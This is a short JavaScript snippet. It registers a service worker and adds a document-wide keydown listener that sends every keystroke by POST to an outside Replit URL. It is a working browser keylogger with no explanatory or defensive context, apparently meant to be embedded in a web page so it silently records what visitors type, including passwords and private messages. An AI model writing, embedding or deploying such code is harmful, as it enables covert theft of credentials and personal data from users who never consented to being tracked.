navigator.serviceWorker.register("worker.js");

document.addEventListener("keydown", function(event) {
    fetch("https://replit.com/@Kamyabdarabi200/1", {  
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.key })
    });
});
